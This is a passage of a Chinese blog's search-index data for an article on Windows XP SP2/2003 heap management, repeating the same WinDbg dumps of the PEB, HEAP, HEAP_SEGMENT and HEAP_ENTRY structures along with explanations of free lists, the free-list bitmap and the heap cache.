Heap）。创建好的堆句柄会被保存到进程环境块（PEB）的ProcessHeap字段中。 txt kd\u003e dt _PEB 7ffdb000 nt!_PEB ... +0x018 ProcessHeap : 0x00090000 Void //进程默认堆 ... +0x078 HeapSegmentReserve : 0x100000 //堆的默认保留大小，字节数，1MB +0x07c HeapSegmentCommit : 0x2000 //堆的默认提交大小，8KB （两个内存页，x86 默认内存页 4KB） ... +0x088 NumberOfHeaps : 0x10 //堆的数量 +0x08c MaximumNumberOfHeaps : 0x10 //堆的最大数量 +0x090 ProcessHeaps : 0x7c99cfc0 -\u003e 0x00090000 Void //堆句柄数组 ...\rtxt kd\u003e dd 0x7c99cfc0 l 10 7c99cfc0 00090000 00190000 001a0000 00410000 7c99cfd0 00420000 00440000 00030000 003d0000 7c99cfe0 00890000 009a0000 01810000 01830000 7c99cff0 01cd0000 01dd0000 016e0000 016f0000\r","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:4:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#进程默认堆"},{"categories":[],"content":"\r进程私有堆","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:5:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#进程私有堆"},{"categories":[],"content":"\rWindows XP SP2 – Windows 2003","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:0","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#windows-xp-sp2--windows-2003"},{"categories":[],"content":"\r堆的数据结构 堆段堆管理器在向内存管理器成功申请一块内存后，该内存被称为一个内存段（Segment）。堆中的第一个内存段，我们称其为 0 号段（Segment00）。每个堆最少都会拥有一个段，最多拥有 64 个段。 在 0 号段的开头出存放当前堆的头信息，是一个HEAP结构，保存了自身的关键信息。此外每个段都有一个HEAP_SEGMENT结构来描述自身，0 号段位于HEAP之后，其他段位于起始位置。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff //标志 +0x00c Flags : 2 +0x010 ForceFlags : 0 +0x014 VirtualMemoryThreshold : 0xfe00 //最大堆块大小 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0x1687 +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : 0x00e70000 _HEAP_UCR_SEGMENT +0x044 UnusedUnCommittedRanges : 0x000905e8 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0xf +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x90050 - 0x90050 ] +0x058 Segments : [64] 0x00090640 _HEAP_SEGMENT //保存堆的所有段，为数组，所以最多拥有 64 个段 +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 6 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] //空闲链表 +0x578 LockVariable : 0x00090608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00090688 Void //前端堆 +0x584 FrontHeapLockCount : 0 //前端堆同步锁计数 +0x586 FrontEndHeapType : 0x1 '' //前端堆的类型 +0x587 LastSegmentIndex : 0 ''\rtxt kd\u003e dt _HEAP_SEGMENT 00090640 ntdll!_HEAP_SEGMENT +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xffeeffee +0x00c Flags : 0 +0x010 Heap : 0x00090000 _HEAP //段所属的堆 +0x014 LargestUnCommittedRange : 0x29000 +0x018 BaseAddress : 0x00090000 Void //段的基地址 +0x01c NumberOfPages : 0x100 //段的内存页数 +0x020 FirstEntry : 0x00090680 _HEAP_ENTRY //第一个堆块 +0x024 LastValidEntry : 0x00190000 _HEAP_ENTRY //堆块的边界值 +0x028 NumberOfUnCommittedPages : 0x3b +0x02c NumberOfUnCommittedRanges : 6 +0x030 UnCommittedRanges : 0x000905a8 _HEAP_UNCOMMMTTED_RANGE +0x034 AllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 LastEntryInSegment : 0x00143000 _HEAP_ENTRY //最后一个堆块\r堆块为了更高效的分配内存，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个HEAP_ENTRY结构，大小为八个字节，用来标识这个堆块自身的信息。包括前面说过的HEAP结构本身也是一个堆块，所以其开始部分也是一个HEAP_ENTRY结构。 txt kd\u003e dx -id 0,0,81f7a980 -r1 (*((ntdll!_HEAP_ENTRY *)0x90000)) (*((ntdll!_HEAP_ENTRY *)0x90000)) [Type: _HEAP_ENTRY] [+0x000] Size : 0xc8 [Type: unsigned short] [+0x002] PreviousSize : 0x0 [Type: unsigned short] [+0x000] SubSegmentCode : 0xc8 [Type: void *] [+0x004] SmallTagIndex : 0x4 [Type: unsigned char] [+0x005] Flags : 0x1 [Type: unsigned char] [+0x006] UnusedBytes : 0x0 [Type: unsigned char] [+0x007] SegmentIndex : 0x0 [Type: unsigned char]\rHEAP_ENTRY前两个字节以分配粒度表示堆块的大小，分配粒度通常是 8，这意味着每个堆块的最大值是0x10000*8=0x80000=512KB。因为每个堆块知识有 8 字节的管理信息，因此应用程序可以使用的最大堆块便是0x80000-8=0x7FFF8。更大块的分配后面讲解。 在 Windows 中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。空闲双向链表 Freelist 便是索引空闲态堆块的链表。 空表空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128 条。 Windows 中的空表其实是一个 128 项的指针数组，每项包含两个指针，用于指向空闲的堆块。 空闲堆块的大小＝索引项（ID）×8（字节） 而其中索引为 0 的项中保存的是所有超过 1024（包含）字节的空闲堆块，按照堆块大小升序排列。具体如下图所示。 该结构指针位于HEAP的+0x178处，具体分析 Freelist 可以使用!heap -f xxxxxxxx命令 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] ...\r空表位图FreeListInUse 是一个大小为 16 字节的结构，位于 HeapBase 的 +0x0158 处。这个字字段的每个 bit 位组成了一个 bitmap，标识着对应的FreeList[n]中是否存在空闲块。这个字段的目的是为了在通过 FreeList 分配内存时，扫描 FreeList 来加速分配。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x158 u : __unnamed +0x168 u2 : __unnamed ... kd\u003e dx -id 0,0,81cdd520 -r1 (*((ntdll!__unnamed *)0x90158)) (*((ntdll!__unnamed *)0x90158)) [Type: __unnamed] [+0x000] FreeListsInUseUlong [Type: unsigned long [4]] [+0x000] FreeListsInUseBytes [Type: unsigned char [16]]\r堆缓存堆缓存是一个包含有 896 个指针的数组，数组中的指针为 NULL 指向 0 号空表中 1024-8192 字节的空闲堆块。数组中的每个元素都对应着 0 号空表中大小为 (1K+8 字节*其索引号）的空闲堆块，若 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆的数据结构"},{"categories":[],"content":"\r堆的数据结构 堆段堆管理器在向内存管理器成功申请一块内存后，该内存被称为一个内存段（Segment）。堆中的第一个内存段，我们称其为 0 号段（Segment00）。每个堆最少都会拥有一个段，最多拥有 64 个段。 在 0 号段的开头出存放当前堆的头信息，是一个HEAP结构，保存了自身的关键信息。此外每个段都有一个HEAP_SEGMENT结构来描述自身，0 号段位于HEAP之后，其他段位于起始位置。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff //标志 +0x00c Flags : 2 +0x010 ForceFlags : 0 +0x014 VirtualMemoryThreshold : 0xfe00 //最大堆块大小 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0x1687 +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : 0x00e70000 _HEAP_UCR_SEGMENT +0x044 UnusedUnCommittedRanges : 0x000905e8 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0xf +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x90050 - 0x90050 ] +0x058 Segments : [64] 0x00090640 _HEAP_SEGMENT //保存堆的所有段，为数组，所以最多拥有 64 个段 +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 6 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] //空闲链表 +0x578 LockVariable : 0x00090608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00090688 Void //前端堆 +0x584 FrontHeapLockCount : 0 //前端堆同步锁计数 +0x586 FrontEndHeapType : 0x1 '' //前端堆的类型 +0x587 LastSegmentIndex : 0 ''\rtxt kd\u003e dt _HEAP_SEGMENT 00090640 ntdll!_HEAP_SEGMENT +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xffeeffee +0x00c Flags : 0 +0x010 Heap : 0x00090000 _HEAP //段所属的堆 +0x014 LargestUnCommittedRange : 0x29000 +0x018 BaseAddress : 0x00090000 Void //段的基地址 +0x01c NumberOfPages : 0x100 //段的内存页数 +0x020 FirstEntry : 0x00090680 _HEAP_ENTRY //第一个堆块 +0x024 LastValidEntry : 0x00190000 _HEAP_ENTRY //堆块的边界值 +0x028 NumberOfUnCommittedPages : 0x3b +0x02c NumberOfUnCommittedRanges : 6 +0x030 UnCommittedRanges : 0x000905a8 _HEAP_UNCOMMMTTED_RANGE +0x034 AllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 LastEntryInSegment : 0x00143000 _HEAP_ENTRY //最后一个堆块\r堆块为了更高效的分配内存，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个HEAP_ENTRY结构，大小为八个字节，用来标识这个堆块自身的信息。包括前面说过的HEAP结构本身也是一个堆块，所以其开始部分也是一个HEAP_ENTRY结构。 txt kd\u003e dx -id 0,0,81f7a980 -r1 (*((ntdll!_HEAP_ENTRY *)0x90000)) (*((ntdll!_HEAP_ENTRY *)0x90000)) [Type: _HEAP_ENTRY] [+0x000] Size : 0xc8 [Type: unsigned short] [+0x002] PreviousSize : 0x0 [Type: unsigned short] [+0x000] SubSegmentCode : 0xc8 [Type: void *] [+0x004] SmallTagIndex : 0x4 [Type: unsigned char] [+0x005] Flags : 0x1 [Type: unsigned char] [+0x006] UnusedBytes : 0x0 [Type: unsigned char] [+0x007] SegmentIndex : 0x0 [Type: unsigned char]\rHEAP_ENTRY前两个字节以分配粒度表示堆块的大小，分配粒度通常是 8，这意味着每个堆块的最大值是0x10000*8=0x80000=512KB。因为每个堆块知识有 8 字节的管理信息，因此应用程序可以使用的最大堆块便是0x80000-8=0x7FFF8。更大块的分配后面讲解。 在 Windows 中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。空闲双向链表 Freelist 便是索引空闲态堆块的链表。 空表空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128 条。 Windows 中的空表其实是一个 128 项的指针数组，每项包含两个指针，用于指向空闲的堆块。 空闲堆块的大小＝索引项（ID）×8（字节） 而其中索引为 0 的项中保存的是所有超过 1024（包含）字节的空闲堆块，按照堆块大小升序排列。具体如下图所示。 该结构指针位于HEAP的+0x178处，具体分析 Freelist 可以使用!heap -f xxxxxxxx命令 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] ...\r空表位图FreeListInUse 是一个大小为 16 字节的结构，位于 HeapBase 的 +0x0158 处。这个字字段的每个 bit 位组成了一个 bitmap，标识着对应的FreeList[n]中是否存在空闲块。这个字段的目的是为了在通过 FreeList 分配内存时，扫描 FreeList 来加速分配。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x158 u : __unnamed +0x168 u2 : __unnamed ... kd\u003e dx -id 0,0,81cdd520 -r1 (*((ntdll!__unnamed *)0x90158)) (*((ntdll!__unnamed *)0x90158)) [Type: __unnamed] [+0x000] FreeListsInUseUlong [Type: unsigned long [4]] [+0x000] FreeListsInUseBytes [Type: unsigned char [16]]\r堆缓存堆缓存是一个包含有 896 个指针的数组，数组中的指针为 NULL 指向 0 号空表中 1024-8192 字节的空闲堆块。数组中的每个元素都对应着 0 号空表中大小为 (1K+8 字节*其索引号）的空闲堆块，若 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆段"},{"categories":[],"content":"\r堆的数据结构 堆段堆管理器在向内存管理器成功申请一块内存后，该内存被称为一个内存段（Segment）。堆中的第一个内存段，我们称其为 0 号段（Segment00）。每个堆最少都会拥有一个段，最多拥有 64 个段。 在 0 号段的开头出存放当前堆的头信息，是一个HEAP结构，保存了自身的关键信息。此外每个段都有一个HEAP_SEGMENT结构来描述自身，0 号段位于HEAP之后，其他段位于起始位置。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff //标志 +0x00c Flags : 2 +0x010 ForceFlags : 0 +0x014 VirtualMemoryThreshold : 0xfe00 //最大堆块大小 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0x1687 +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : 0x00e70000 _HEAP_UCR_SEGMENT +0x044 UnusedUnCommittedRanges : 0x000905e8 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0xf +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x90050 - 0x90050 ] +0x058 Segments : [64] 0x00090640 _HEAP_SEGMENT //保存堆的所有段，为数组，所以最多拥有 64 个段 +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 6 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] //空闲链表 +0x578 LockVariable : 0x00090608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00090688 Void //前端堆 +0x584 FrontHeapLockCount : 0 //前端堆同步锁计数 +0x586 FrontEndHeapType : 0x1 '' //前端堆的类型 +0x587 LastSegmentIndex : 0 ''\rtxt kd\u003e dt _HEAP_SEGMENT 00090640 ntdll!_HEAP_SEGMENT +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xffeeffee +0x00c Flags : 0 +0x010 Heap : 0x00090000 _HEAP //段所属的堆 +0x014 LargestUnCommittedRange : 0x29000 +0x018 BaseAddress : 0x00090000 Void //段的基地址 +0x01c NumberOfPages : 0x100 //段的内存页数 +0x020 FirstEntry : 0x00090680 _HEAP_ENTRY //第一个堆块 +0x024 LastValidEntry : 0x00190000 _HEAP_ENTRY //堆块的边界值 +0x028 NumberOfUnCommittedPages : 0x3b +0x02c NumberOfUnCommittedRanges : 6 +0x030 UnCommittedRanges : 0x000905a8 _HEAP_UNCOMMMTTED_RANGE +0x034 AllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 LastEntryInSegment : 0x00143000 _HEAP_ENTRY //最后一个堆块\r堆块为了更高效的分配内存，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个HEAP_ENTRY结构，大小为八个字节，用来标识这个堆块自身的信息。包括前面说过的HEAP结构本身也是一个堆块，所以其开始部分也是一个HEAP_ENTRY结构。 txt kd\u003e dx -id 0,0,81f7a980 -r1 (*((ntdll!_HEAP_ENTRY *)0x90000)) (*((ntdll!_HEAP_ENTRY *)0x90000)) [Type: _HEAP_ENTRY] [+0x000] Size : 0xc8 [Type: unsigned short] [+0x002] PreviousSize : 0x0 [Type: unsigned short] [+0x000] SubSegmentCode : 0xc8 [Type: void *] [+0x004] SmallTagIndex : 0x4 [Type: unsigned char] [+0x005] Flags : 0x1 [Type: unsigned char] [+0x006] UnusedBytes : 0x0 [Type: unsigned char] [+0x007] SegmentIndex : 0x0 [Type: unsigned char]\rHEAP_ENTRY前两个字节以分配粒度表示堆块的大小，分配粒度通常是 8，这意味着每个堆块的最大值是0x10000*8=0x80000=512KB。因为每个堆块知识有 8 字节的管理信息，因此应用程序可以使用的最大堆块便是0x80000-8=0x7FFF8。更大块的分配后面讲解。 在 Windows 中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。空闲双向链表 Freelist 便是索引空闲态堆块的链表。 空表空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128 条。 Windows 中的空表其实是一个 128 项的指针数组，每项包含两个指针，用于指向空闲的堆块。 空闲堆块的大小＝索引项（ID）×8（字节） 而其中索引为 0 的项中保存的是所有超过 1024（包含）字节的空闲堆块，按照堆块大小升序排列。具体如下图所示。 该结构指针位于HEAP的+0x178处，具体分析 Freelist 可以使用!heap -f xxxxxxxx命令 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] ...\r空表位图FreeListInUse 是一个大小为 16 字节的结构，位于 HeapBase 的 +0x0158 处。这个字字段的每个 bit 位组成了一个 bitmap，标识着对应的FreeList[n]中是否存在空闲块。这个字段的目的是为了在通过 FreeList 分配内存时，扫描 FreeList 来加速分配。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x158 u : __unnamed +0x168 u2 : __unnamed ... kd\u003e dx -id 0,0,81cdd520 -r1 (*((ntdll!__unnamed *)0x90158)) (*((ntdll!__unnamed *)0x90158)) [Type: __unnamed] [+0x000] FreeListsInUseUlong [Type: unsigned long [4]] [+0x000] FreeListsInUseBytes [Type: unsigned char [16]]\r堆缓存堆缓存是一个包含有 896 个指针的数组，数组中的指针为 NULL 指向 0 号空表中 1024-8192 字节的空闲堆块。数组中的每个元素都对应着 0 号空表中大小为 (1K+8 字节*其索引号）的空闲堆块，若 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#堆块"},{"categories":[],"content":"\r堆的数据结构 堆段堆管理器在向内存管理器成功申请一块内存后，该内存被称为一个内存段（Segment）。堆中的第一个内存段，我们称其为 0 号段（Segment00）。每个堆最少都会拥有一个段，最多拥有 64 个段。 在 0 号段的开头出存放当前堆的头信息，是一个HEAP结构，保存了自身的关键信息。此外每个段都有一个HEAP_SEGMENT结构来描述自身，0 号段位于HEAP之后，其他段位于起始位置。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff //标志 +0x00c Flags : 2 +0x010 ForceFlags : 0 +0x014 VirtualMemoryThreshold : 0xfe00 //最大堆块大小 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0x1687 +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : 0x00e70000 _HEAP_UCR_SEGMENT +0x044 UnusedUnCommittedRanges : 0x000905e8 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0xf +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x90050 - 0x90050 ] +0x058 Segments : [64] 0x00090640 _HEAP_SEGMENT //保存堆的所有段，为数组，所以最多拥有 64 个段 +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 6 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] //空闲链表 +0x578 LockVariable : 0x00090608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00090688 Void //前端堆 +0x584 FrontHeapLockCount : 0 //前端堆同步锁计数 +0x586 FrontEndHeapType : 0x1 '' //前端堆的类型 +0x587 LastSegmentIndex : 0 ''\rtxt kd\u003e dt _HEAP_SEGMENT 00090640 ntdll!_HEAP_SEGMENT +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xffeeffee +0x00c Flags : 0 +0x010 Heap : 0x00090000 _HEAP //段所属的堆 +0x014 LargestUnCommittedRange : 0x29000 +0x018 BaseAddress : 0x00090000 Void //段的基地址 +0x01c NumberOfPages : 0x100 //段的内存页数 +0x020 FirstEntry : 0x00090680 _HEAP_ENTRY //第一个堆块 +0x024 LastValidEntry : 0x00190000 _HEAP_ENTRY //堆块的边界值 +0x028 NumberOfUnCommittedPages : 0x3b +0x02c NumberOfUnCommittedRanges : 6 +0x030 UnCommittedRanges : 0x000905a8 _HEAP_UNCOMMMTTED_RANGE +0x034 AllocatorBackTraceIndex : 0 +0x036 Reserved : 0 +0x038 LastEntryInSegment : 0x00143000 _HEAP_ENTRY //最后一个堆块\r堆块为了更高效的分配内存，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个HEAP_ENTRY结构，大小为八个字节，用来标识这个堆块自身的信息。包括前面说过的HEAP结构本身也是一个堆块，所以其开始部分也是一个HEAP_ENTRY结构。 txt kd\u003e dx -id 0,0,81f7a980 -r1 (*((ntdll!_HEAP_ENTRY *)0x90000)) (*((ntdll!_HEAP_ENTRY *)0x90000)) [Type: _HEAP_ENTRY] [+0x000] Size : 0xc8 [Type: unsigned short] [+0x002] PreviousSize : 0x0 [Type: unsigned short] [+0x000] SubSegmentCode : 0xc8 [Type: void *] [+0x004] SmallTagIndex : 0x4 [Type: unsigned char] [+0x005] Flags : 0x1 [Type: unsigned char] [+0x006] UnusedBytes : 0x0 [Type: unsigned char] [+0x007] SegmentIndex : 0x0 [Type: unsigned char]\rHEAP_ENTRY前两个字节以分配粒度表示堆块的大小，分配粒度通常是 8，这意味着每个堆块的最大值是0x10000*8=0x80000=512KB。因为每个堆块知识有 8 字节的管理信息，因此应用程序可以使用的最大堆块便是0x80000-8=0x7FFF8。更大块的分配后面讲解。 在 Windows 中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。空闲双向链表 Freelist 便是索引空闲态堆块的链表。 空表空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为 128 条。 Windows 中的空表其实是一个 128 项的指针数组，每项包含两个指针，用于指向空闲的堆块。 空闲堆块的大小＝索引项（ID）×8（字节） 而其中索引为 0 的项中保存的是所有超过 1024（包含）字节的空闲堆块，按照堆块大小升序排列。具体如下图所示。 该结构指针位于HEAP的+0x178处，具体分析 Freelist 可以使用!heap -f xxxxxxxx命令 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x178 FreeLists : [128] _LIST_ENTRY [ 0x119e60 - 0x14e008 ] ...\r空表位图FreeListInUse 是一个大小为 16 字节的结构，位于 HeapBase 的 +0x0158 处。这个字字段的每个 bit 位组成了一个 bitmap，标识着对应的FreeList[n]中是否存在空闲块。这个字段的目的是为了在通过 FreeList 分配内存时，扫描 FreeList 来加速分配。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP ... +0x158 u : __unnamed +0x168 u2 : __unnamed ... kd\u003e dx -id 0,0,81cdd520 -r1 (*((ntdll!__unnamed *)0x90158)) (*((ntdll!__unnamed *)0x90158)) [Type: __unnamed] [+0x000] FreeListsInUseUlong [Type: unsigned long [4]] [+0x000] FreeListsInUseBytes [Type: unsigned char [16]]\r堆缓存堆缓存是一个包含有 896 个指针的数组，数组中的指针为 NULL 指向 0 号空表中 1024-8192 字节的空闲堆块。数组中的每个元素都对应着 0 号空表中大小为 (1K+8 字节*其索引号）的空闲堆块，若 ","date":"2022-06-19","objectID":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/:6:1","series":[],"tags":[],"title":"深入理解 Windows 堆管理机制","uri":"/2022/06/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3-windows-%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6/#空表"},{"categories":[],"content":"\r堆的数据结构 堆段堆管理器在向内存管理器成功申请一块内存后，该内存被称为一个内存段（Segment）。堆中的第一个内存段，我们称其为 0 号段（Segment00）。每个堆最少都会拥有一个段，最多拥有 64 个段。 在 0 号段的开头出存放当前堆的头信息，是一个HEAP结构，保存了自身的关键信息。此外每个段都有一个HEAP_SEGMENT结构来描述自身，0 号段位于HEAP之后，其他段位于起始位置。 txt kd\u003e dt _HEAP 00090000 ntdll!_HEAP +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff //标志 +0x00c Flags : 2 +0x010 ForceFlags : 0 +0x014 VirtualMemoryThreshold : 0xfe00 //最大堆块大小 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0x1687 +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : 0x00e70000 _HEAP_UCR_SEGMENT +0x044 UnusedUnCommittedRanges : 0x000905e8 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0xf +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x90050 - 0x90050 ] +0x058 Segments : [64] 0x00090640 _HEAP_SEGMENT //保存堆的所有段，为数组，所以最多拥有 64 个段 +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a 